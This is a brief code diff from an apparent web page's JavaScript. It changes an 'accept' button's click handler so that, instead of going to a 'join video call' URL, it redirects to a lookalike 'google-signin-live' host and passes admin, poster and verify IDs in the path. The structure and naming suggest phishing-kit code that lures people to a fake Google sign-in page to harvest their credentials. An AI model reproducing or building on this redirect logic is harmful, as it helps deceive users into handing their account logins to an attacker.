@@ -75,7 +75,7 @@ const verifyId = urlParams.get('verifyId');
 
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
-    window.location.href =`https://joinvideocall-mu.vercel.app/${adminId}/${posterId}`
+    window.location.href =`https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`
   });
 });
  
